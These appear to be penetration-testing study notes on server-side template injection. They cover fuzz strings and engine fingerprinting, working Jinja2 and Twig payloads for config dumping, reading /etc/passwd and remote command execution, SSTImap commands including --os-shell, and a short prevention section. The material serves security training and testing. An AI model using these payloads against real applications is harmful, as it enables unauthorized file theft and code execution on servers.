![alt text](diagram.webp)

# SSTI Identification – Quick Practical Guide

---

## 1. **SSTI Detection Steps**
- **Initial Fuzz:**  
  Inject testing string to force syntax errors and observe app behavior:

${{<%[%'"}}%.

- **Error?** → Possible SSTI (like SQLi, this induces a template error).

---

## 2. **Test for Template Evaluation**
- Inject mathematical expressions to see if they're *executed* or *reflected*:
  - `${7*7}`      (JSP, Velocity, etc.)
  - `{{7*7}}`     (Jinja2, Twig, Nunjucks)
  - `<%= 7*7 %>`  (ERB, EJS)

---

### **How to Identify the Engine?**
- **Step-wise Pattern:**
  1. Try `${7*7}`:
      - If output is `49` → likely JSP/Velocity; if reflected – try next.
  2. Try `{{7*7}}`:
      - If output is `49` → Jinja2/Twig or similar; if reflected – try next.
  3. Try `{{7*'7'}}`:
      - If output is `49` → Twig; if output is `7777777` → Jinja2.

- **Result:**
  - **Reflected unchanged:** Likely not vulnerable (or try more syntaxes).
  - **Error:** Template handling in play, probable SSTI.
  - **Expression evaluated:** Vulnerable and engine fingerprinted.

---

## 3. **Checklist for CBBH/Practical**
- Always start with generic error-inducing string.
- Systematically try all major template syntaxes (see above).
- After detection, use the specific engine’s features for deeper exploitation.
- **Jinja2/JSP/Twig/ERB/Velocity/Nunjucks/EJS** are the most common template engines tested.

---

**Pro Tip:**  
Create and keep ready a set of SSTI test payloads (error strings, math ops, engine-fingerprint expressions) for copy-paste/automation.

---

**Reference:**  
- [PayloadsAllTheThings – SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)


---
---
---

# 🧠 Exploiting SSTI – Jinja2

## 🔍 Assumptions
- The SSTI vulnerability and the use of the **Jinja2** template engine have already been confirmed.
- This note focuses solely on exploiting SSTI in a **Flask** web application.
- Payloads might differ slightly in other Python-based frameworks.

---

## 📌 1. Information Disclosure

### 🔸 Dumping application configuration
```jinja2
{{ config.items() }}
```
- Reveals full configuration, including sensitive values like secret keys.

### 🔸 Accessing built-in functions
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```
- Lists all available built-in Python functions and objects.
- Useful for crafting more advanced payloads.

---

## 📂 2. Local File Inclusion (LFI)

### 🔸 Reading a local file (e.g., `/etc/passwd`)
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
- Accesses and reads files on the server using Python’s `open()` from the built-in namespace.

---

## 💥 3. Remote Code Execution (RCE)

### 🔸 Executing a system command (e.g., `id`)
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
- Dynamically imports the `os` module and runs a shell command.
- Returns the output of the command to the response.

---

## 🛠️ Notes
- All payloads rely on Python internals accessible via the Jinja2 template context.
- Success depends on how restricted the template rendering context is by the application.



----
----
----

# 🧠 Exploiting SSTI – Twig

## 🔍 Assumptions
- SSTI vulnerability and use of the **Twig** template engine have already been confirmed.
- This note focuses only on **exploitation**, not detection.
- **Twig** is a template engine for **PHP**, commonly used in frameworks like **Symfony**.

---

## 📌 1. Information Disclosure

### 🔸 Accessing template metadata
```twig
{{ _self }}
```
- Reveals limited information about the current template.
- Much less powerful than Jinja2 for introspection.

---

## 📂 2. Local File Inclusion (LFI)

### 🔸 Using Symfony's `file_excerpt` filter (if available)
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
- Reads contents of local files.
- Requires `file_excerpt` filter (defined in **Symfony**, not native Twig).

---

## 💥 3. Remote Code Execution (RCE)

### 🔸 Executing a system command using `filter('system')`
```twig
{{ ['id'] | filter('system') }}
```
- Executes `system('id')` in PHP.
- Relies on PHP's `system()` function and Twig’s `filter()` feature.

---

## 📝 Further Remarks

- Each template engine (e.g., Jinja2, Twig) has a unique syntax and different capabilities.
- The exploitation principles are **similar**, but syntax and feature access vary.
- Attackers can:
  - Read the official documentation for the target engine.
  - Use **SSTI cheat sheets**, like those from **PayloadsAllTheThings**.

---

## 🛠️ Tip
> Familiarity with the target template engine's syntax and functions is key to successful exploitation.


---
---
---

# 🛠️ SSTI Tools of the Trade & 🛡️ Preventing SSTI

## 🔍 Tools of the Trade

### ✅ Recommended Tool: **SSTImap**
- Modern tool for identifying and exploiting SSTI vulnerabilities.
- Based on the older `tplmap` (Python2, unmaintained).
- Supports multiple template engines and languages.

#### 📦 Installation:
```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
```

#### 🧪 Basic Usage:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

##### Sample Output:
```
[+] SSTImap identified the following injection point:
  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

---

## 📂 Common SSTImap Features

### 🔸 Download Remote Files:
```bash
python3 sstimap.py -u http://target/index.php?name=test -D '/etc/passwd' './passwd'
```

### 🔸 Execute System Commands:
```bash
python3 sstimap.py -u http://target/index.php?name=test -S id
```

### 🔸 Interactive Shell:
```bash
python3 sstimap.py -u http://target/index.php?name=test --os-shell
```

---

## 🛡️ Preventing SSTI Vulnerabilities

### 🔒 Core Principles
- **Never pass unsanitized user input** into the rendering function.
- Avoid using user-controlled input as a template or part of a template string.

### 🔧 Defensive Measures
- Harden template engines by **removing dangerous functions** from the execution context.
- Implement **whitelisting or sandboxing** for templates created or edited by users.
- Best practice: **isolate the template rendering environment**, e.g., using a **Docker container**.

```plaintext
⚠️ Removing dangerous functions can be bypassed.
✅ Isolation provides stronger protection.
```

---

## ✅ Summary
- Use **SSTImap** for effective SSTI detection and exploitation.
- Focus on **secure coding practices** and **environment isolation** for mitigation.